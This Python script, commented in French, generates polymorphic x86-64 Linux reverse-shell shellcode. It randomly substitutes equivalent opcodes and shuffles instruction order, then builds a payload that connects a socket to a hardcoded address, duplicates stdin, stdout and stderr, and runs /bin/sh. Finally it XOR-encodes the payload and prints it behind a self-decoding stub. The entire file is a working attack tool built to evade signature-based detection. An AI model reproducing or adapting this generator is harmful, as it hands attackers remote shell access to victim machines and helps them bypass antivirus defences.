
from random import randint as rr
from opcodelist import *

# Fonction qui va clean les registres principaux avant le lancement du programme
# Utilisation de plusieurs opcodes et ordres des instructions aléatoire
def clean(result):
    # Liste qui va servir à rendre l'ordre aléatoire
    list_registre = ["rax", "rbx", "rcx", "rdx", "rdi", "rsi"]
    # Tant que la liste n'est pas vide
    while len(list_registre) > 0:
        # Tirage d'un chiffre aléatoire
        num = rr(0,len(list_registre)-1)

        # Clean du registre rax
        if str(list_registre[num]) == "rax":
            # On récupère aléatoirement un des opcodes dans le tableau préalablement rempli
            result += list_xor_rax[rr(0,len(list_xor_rax)-1)]
            # On supprime l'élément de la liste pour ne pas refaire un clean de rax
            del list_registre[num]

        # Clean du registre rbx
        elif str(list_registre[num]) == "rbx":
            # On récupère aléatoirement un des opcodes dans le tableau préalablement rempli
            result += list_xor_rbx[rr(0,len(list_xor_rbx)-1)]
            # On supprime l'élément de la liste pour ne pas refaire un clean de rbx
            del list_registre[num]

        # Clean du registre rcx
        elif str(list_registre[num]) == "rcx":
            # On récupère aléatoirement un des opcodes dans le tableau préalablement rempli
            result += list_xor_rcx[rr(0,len(list_xor_rcx)-1)]
            # On supprime l'élément de la liste pour ne pas refaire un clean de rcx
            del list_registre[num]

        # Clean du registre rdi
        elif str(list_registre[num]) == "rdi":
            # On récupère aléatoirement un des opcodes dans le tableau préalablement rempli
            result += list_xor_rdi[rr(0,len(list_xor_rdi)-1)]
            # On supprime l'élément de la liste pour ne pas refaire un clean de rdi
            del list_registre[num]

        # Clean du registre rsi
        elif str(list_registre[num]) == "rsi":
            # On récupère aléatoirement un des opcodes dans le tableau préalablement rempli
            result += list_xor_rsi[rr(0,len(list_xor_rsi)-1)]
            # On supprime l'élément de la liste pour ne pas refaire un clean de rsi
            del list_registre[num]

        # Clean du registre rdx
        elif str(list_registre[num]) == "rdx":
            # On récupère aléatoirement un des opcodes dans le tableau préalablement rempli
            result += list_xor_rdx[rr(0,len(list_xor_rdx)-1)]
            # On supprime l'élément de la liste pour ne pas refaire un clean de rdx
            del list_registre[num]

    # On retourne les opcodes les uns à la suite des autres
    return(result)

# Fonction pour créer le socket qui va permettre de se connecter
def create_socket(result):
    # Liste qui va servir à rendre l'ordre aléatoire (pour les  blocs d'instructions
    # qui peuvent être inversés)
    list_registre = ["al", "rdi", "rsi"]
    # Tant que la liste n'est pas vide
    while len(list_registre) > 0:
        # Tirage d'un chiffre aléatoire
        num = rr(0,len(list_registre)-1)

        # On met 0x29 dans le registre al (pour l'appel système)
        if str(list_registre[num]) == "al":
            result += list_mov_al_29[rr(0,len(list_mov_al_29)-1)] # mov al, 0x29
            del list_registre[num]

        # On met Ox02 dans le registre bl puis dans rdi
        elif str(list_registre[num]) == "rdi":
            result += list_mov_bl_02[rr(0,len(list_mov_bl_02)-1)] # mov bl, 0x02

            result += list_mov_rdi[rr(0,len(list_mov_rdi)-1)] # mov rdi, rbx
            del list_registre[num]

        # On met Ox02 dans le registre bl puis dans rsi
        elif str(list_registre[num]) == "rsi":
            result += list_mov_bl_01[rr(0,len(list_mov_bl_01)-1)] # mov bl, 0x01

            result += list_mov_rsi[rr(0,len(list_mov_rsi)-1)] # mov rsi, rbx
            del list_registre[num]

    result += list_syscall[rr(0,len(list_syscall)-1)] # Syscall
    return(result)

# Fonction qui sert à se connecter à la machine en écoute en utilisant le socket
def connect_socket(result):
    # Ordre aléatoire comme dans les précédentes fonctions
    list_registre = ["rdi", "r10"]
    while len(list_registre) > 0:
        num = rr(0,len(list_registre)-1)
        if str(list_registre[num]) == "rdi":
            result += list_mov_rdi_rax[rr(0,len(list_mov_rdi_rax)-1)] # mov rdi, rax
            del list_registre[num]

        elif str(list_registre[num]) == "r10":
            result += list_mov_r10_rax[rr(0,len(list_mov_r10_rax)-1)] # mov r10, rax
            del list_registre[num]

    result += list_xor_rax[rr(0,len(list_xor_rax)-1)] # xor rax, rax

    result += list_mov_al_02[rr(0,len(list_mov_al_02)-1)] # mov al, 0x2a

    result += list_xor_rbx[rr(0,len(list_xor_rbx)-1)]

    result += list_push_rbx[rr(0,len(list_push_rbx)-1)] # push rbx

    result += list_mov_esi_02[rr(0,len(list_mov_esi_02)-1)] # mov esi, 0x020ffff80 

    result += list_sub_esi_01[rr(0,len(list_sub_esi_01)-1)] # sub esi, 0x010ffff01

    result += list_pushw_01[rr(0,len(list_pushw_01)-1)] # pushw 0x1D23 

    result += list_pushw_02[rr(0,len(list_pushw_02)-1)] # pushw 0x02 

    result += list_mov_rsi_rsp[rr(0,len(list_mov_rsi_rsp)-1)] # mov rsi, rsp

    result += list_mov_dl_24[rr(0,len(list_mov_dl_24)-1)] # mov dl, 0x24

    result += list_syscall[rr(0,len(list_syscall)-1)] # Syscall, can't do polymorphism
    return(result)

# Fonction qui va permettre de créer des files descriptor pour stdin, stdout
# et stderr
def dup2x3(result):
    # Ordre aléatoire pour les blocs d'instructions qui peuvent être inversés
    list_registre = ["rax", "rdx"]
    while len(list_registre) > 0:
        num = rr(0,len(list_registre)-1)
        if str(list_registre[num]) == "rax":
            result += list_xor_rax[rr(0,len(list_xor_rax)-1)]
            del list_registre[num]

        elif str(list_registre[num]) == "rdx":
            result += list_xor_rdx[rr(0,len(list_xor_rdx)-1)]
            del list_registre[num]

    result += list_mov_al_21[rr(0,len(list_mov_al_21)-1)] # mov al, 0x21

    result += list_mov_rdi_r10[rr(0,len(list_mov_rdi_r10)-1)] # mov rdi, r10 
    
    result += list_xor_rsi[rr(0,len(list_xor_rsi)-1)] # xor rsi, rsi 

    result += list_syscall[rr(0,len(list_syscall)-1)] # Syscall, can't do polymorphism


    list_registre = ["rax", "rdx"]
    while len(list_registre) > 0:
        num = rr(0,len(list_registre)-1)
        if str(list_registre[num]) == "rax":
            result += list_xor_rax[rr(0,len(list_xor_rax)-1)] #  xor rax, rax
            del list_registre[num]

        elif str(list_registre[num]) == "rdx":
            result += list_xor_rdx[rr(0,len(list_xor_rdx)-1)] # xor rdx, rdx
            del list_registre[num]

    result += list_mov_al_21[rr(0,len(list_mov_al_21)-1)] # mov al, 0x21

    result += list_mov_rdi_r10[rr(0,len(list_mov_rdi_r10)-1)]  # mov rdi, r10

    result += list_inc_rsi[rr(0,len(list_inc_rsi)-1)] # inc rsi

    result += list_syscall[rr(0,len(list_syscall)-1)] # Syscall, can't do polymorphism


    list_registre = ["rax", "rdx"]
    while len(list_registre) > 0:
        num = rr(0,len(list_registre)-1)
        if str(list_registre[num]) == "rax":
            result += list_xor_rax[rr(0,len(list_xor_rax)-1)]  # xor rax, rax
            del list_registre[num]
        
        elif str(list_registre[num]) == "rdx":
            result += list_xor_rdx[rr(0,len(list_xor_rdx)-1)]  # xor rdx, rdx
            del list_registre[num]


    result += list_mov_al_21[rr(0,len(list_mov_al_21)-1)] # mov al, 0x21

    result += list_mov_rdi_r10[rr(0,len(list_mov_rdi_r10)-1)] # mov rdi, r10

    result += list_inc_rsi[rr(0,len(list_inc_rsi)-1)] # inc rsi

    result += list_syscall[rr(0,len(list_syscall)-1)] # Syscall, can't do polymorphism
    return(result)

# Lancement du /bin/bash
def bash_plz(result):
    list_registre = ["rax", "rdx"]
    while len(list_registre) > 0:
        num = rr(0,len(list_registre)-1)
        if str(list_registre[num]) == "rax":
            result += list_xor_rax[rr(0,len(list_xor_rax)-1)] # xor rax, rax
            del list_registre[num]
        
        elif str(list_registre[num]) == "rdx":
            result += list_xor_rdx[rr(0,len(list_xor_rdx)-1)] # xor rdx, rdx
            del list_registre[num]


    result += list_mov_68[rr(0,len(list_mov_68)-1)] # mov rbx, 0x68732f6e69622f2f

    result += list_push_rax[rr(0,len(list_push_rax)-1)] # push rax

    result += list_push_rbx[rr(0,len(list_push_rbx)-1)] # push rbx

    result += list_mov_rdi_rsp[rr(0,len(list_mov_rdi_rsp)-1)] # mov rdi, rsp

    result += list_push_rax[rr(0,len(list_push_rax)-1)]  # push rax

    result += list_push_rdi[rr(0,len(list_push_rdi)-1)] # push rdi

    result += list_mov_rsi_rsp[rr(0,len(list_mov_rsi_rsp)-1)] # mov rsi, rsp

    result += list_mov_al_03b[rr(0,len(list_mov_al_03b)-1)] # mov al, 0x3b

    result += list_syscall[rr(0,len(list_syscall)-1)] # Syscall, can't do polymorphism

    return(result)

# Fonction d'exit pour le programme en assembleur
def exit_asm(result):
    list_registre = ["rax", "rdx"]
    while len(list_registre) > 0:
        num = rr(0,len(list_registre)-1)
        if str(list_registre[num]) == "rax":
            result += list_xor_rdi[rr(0,len(list_xor_rdi)-1)] # xor rdi, rdi
            del list_registre[num]
        
        elif str(list_registre[num]) == "rdx":
            result += list_xor_rax[rr(0,len(list_xor_rax)-1)] # xor rax, rax
            del list_registre[num]

    result += list_mov_al_03c[rr(0,len(list_mov_al_03c)-1)] # mov al, 0x3c 
    
    result += list_syscall[rr(0,len(list_syscall)-1)] # Syscall, can't do polymorphism
    return(result)

# Fonction qui sert à encoder le shellcode
def xor(SC):
    # valeur que l'on utilise pour le xor
    key = 4

    # on passe notre shellcode en bytes pour l'utiliser plus tard dans la fonction
    SC_bytes = bytes.fromhex(SC)

    # On ajoute les \x à notre shellcode (qui est de base en hexa avec tous les opcodes
    # les uns à la suite des autres)
    SC_hex = [SC[i:i+2] for i in range(0, len(SC), 2)]
    SC_str = "".join(["\\x" + x for x in SC_hex])

    # Shellcode non encodé avec les \x
    print("\n\n", SC_str, "\n\n")
    
    # Affichage du shellcode final (encodé)
    print("Shellcode Encoded : \n")

    # Opcodes qui vont servir à décoder notre shellcode avant son exécution
    print("\\xeb\\x11\\x5e\\x31\\xc9\\xb1" + "\\x{:02x}".format(int(len(SC_str)/4)) + "\\x80\\x74\\x0e\\xff" + "\\x{:02x}".format(key) + "\\x80\\xe9\\x01\\x75\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff", end="")

    # Encodage de notre reverse shell
    for byte in SC_bytes:
        encoded_byte = byte ^ key
        print("\\x{:02x}".format(encoded_byte), end="")

    print("\n")

# Fonction qui appelle toutes les autres
def construct(result):
    result = clean(result)
    result = create_socket(result)
    result = connect_socket(result)
    result = dup2x3(result)
    result = bash_plz(result)
    result = exit_asm(result)
    return(result)

# Lancement du programme
def init():
    result = ""
    print("\nGeneration de votre shellcode ...\n")
    result = (construct(result))
    xor(result)

init()
